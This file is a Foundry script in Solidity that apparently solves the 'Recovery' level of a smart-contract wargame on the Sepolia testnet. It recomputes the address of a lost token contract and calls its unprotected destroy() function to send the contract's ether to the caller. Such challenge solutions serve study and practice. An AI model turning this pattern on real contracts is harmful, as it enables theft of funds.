// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {SimpleToken} from "src/17Recovery.sol";

contract RecoveryAttack is Script {
    address constant CHALLENGE = 0xd159467ead97F73E7BB0C0417D7388c0AAe39f6D;
    SimpleToken public simpleToken;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        // https://sepolia.etherscan.io/address/0xd159467ead97F73E7BB0C0417D7388c0AAe39f6D#internaltx
        // or calculate the address of the contract deployed by the challenge contract
        address simpleTokenAddress =
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), CHALLENGE, bytes1(0x01))))));
        console.log("SimpleToken deployed at:", simpleTokenAddress);
        simpleToken = SimpleToken(payable(simpleTokenAddress));
        simpleToken.destroy(payable(msg.sender));
        vm.stopBroadcast();
    }
}
